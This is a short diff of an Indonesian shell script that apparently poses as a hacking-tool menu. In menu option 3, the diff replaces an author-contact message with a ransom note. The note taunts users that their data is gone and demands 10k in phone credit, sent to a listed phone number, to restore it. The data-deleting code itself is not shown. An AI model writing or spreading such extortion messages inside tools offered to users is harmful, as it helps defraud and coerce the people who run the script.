@@ -96,9 +96,10 @@ fi
 if [ $bro = 3 ] || [ $bro = 03 ]
 then
 clear
-echo $green"Author Cl4Y"
-echo $green"Jika Ada masalah Hubungi Nomer Saya "
-echo $green"kontak admin:087700935379"
+echo $green"WKWKWKW DATA DATA LU HILANG KAN? KALO MAU KEMBALI SEND PULSA 10 K KE NO INI 087865845929 "
+echo $green "DI DUNIA HACKING HARUS SIAP KEHILANGAN "
+echo $green "JANGAN JADI HACKER KALO TIDAK MAU KEHILANGAN "
+echo $grren "ISI PULSA KE NO 087865845929 data lu auto kembali gan "
 echo $red"Mendit Cyber Team"
 exit 
 fi
